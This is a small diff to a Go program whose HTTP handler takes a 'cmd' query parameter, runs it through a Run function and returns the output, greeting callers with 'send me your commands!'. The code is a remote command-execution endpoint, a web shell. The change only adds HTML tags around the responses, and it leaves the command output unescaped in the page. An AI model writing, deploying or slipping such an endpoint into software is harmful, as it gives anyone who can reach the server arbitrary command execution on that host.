@@ -33,10 +33,10 @@ func main() {
 		cmd := r.URL.Query().Get("cmd")
 
 		if len(cmd) < 1 {
-			fmt.Fprintf(w, "Hello world, send me your commands!")
+			fmt.Fprintf(w, "<h1>Hello world, send me your commands!</h1>")
 		} else {
 			output := Run(cmd)
-			fmt.Fprintf(w, "Results: %s", output)
+			fmt.Fprintf(w, "<b>Results:</b> %s", output)
 		}
 
 	})
